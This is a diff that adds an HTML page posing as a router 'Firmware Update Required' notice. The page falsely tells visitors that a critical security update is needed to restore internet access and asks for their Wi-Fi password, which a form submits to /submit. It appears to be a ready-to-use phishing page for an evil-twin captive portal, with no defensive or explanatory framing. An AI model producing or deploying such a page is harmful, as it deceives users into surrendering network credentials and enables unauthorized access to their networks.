@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Router Firmware Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f4; text-align: center; margin-top: 50px; }
+        .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; width: 90%; }
+        h2 { color: #333; }
+        input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        input[type="submit"] { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
+        input[type="submit"]:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Firmware Update Required</h2>
+        <p>A critical security update is required for your router to restore internet connectivity.</p>
+        <p>Please enter your Wi-Fi password to authorize the update.</p>
+        <form action="/submit" method="POST">
+            <input type="password" name="password" placeholder="Wi-Fi Password" required>
+            <input type="submit" value="Install Update">
+        </form>
+    </div>
+</body>
+</html>
